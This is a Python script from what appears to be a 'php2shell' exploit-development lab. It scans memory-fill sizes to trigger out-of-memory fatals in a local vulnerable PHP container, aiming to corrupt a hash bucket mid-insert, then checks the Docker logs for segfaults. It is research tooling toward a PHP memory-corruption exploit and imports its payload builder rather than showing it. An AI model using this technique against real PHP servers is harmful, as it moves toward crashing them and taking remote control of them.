#!/usr/bin/env python3
"""php2shell lab, oom15: 8B rotation scan -> catch the key (328B) dying.

Facts: dbg@65480 completes at peak==limit exactly (staircase touches wall at
run end). 1B less fill rotates every subsequent alloc boundary; 8B = one
full rotation cycle of Zend MM size classes. Scan rem 65472..65480 and
capture each fatal's alloc fingerprint. alloc=328 (key string) => the
add_to_hash post-commit death => malformed bucket => segfault check via
docker logs (exec hangs on this VM; logs always work).
"""
import re
import socket
import subprocess
import sys
import time

sys.path.insert(0, "/tmp/phplab")
from oom14 import build, restart, send, alloc_n

def segfault_check():
    r = subprocess.run(["docker", "logs", "php_vuln", "--tail", "40"],
                       capture_output=True, text=True)
    txt = r.stdout + r.stderr
    hits = [l for l in txt.splitlines()
            if "Segmentation" in l or "SIGSEGV" in l or "signal SIG" in l]
    return hits

def main():
    log = lambda *a: print(*a, flush=True)
    for rem in range(65480, 65471, -1):
        restart()
        fatal, text = send(8081, build(rem))
        a = alloc_n(text) if fatal else None
        log(f"rem={rem}: fatal={fatal} alloc={a}")
        if fatal and a is not None and a <= 360:
            log(f"*** KEY DEATH rem={rem} alloc={a} — segfault check ***")
            time.sleep(1.5)
            for h in segfault_check():
                log("SEGFAULT LINE:", h)
            return
    log("scan done")
    log("--- any segfault lines in log tail:")
    for h in segfault_check():
        log("LINE:", h)

if __name__ == "__main__":
    main()
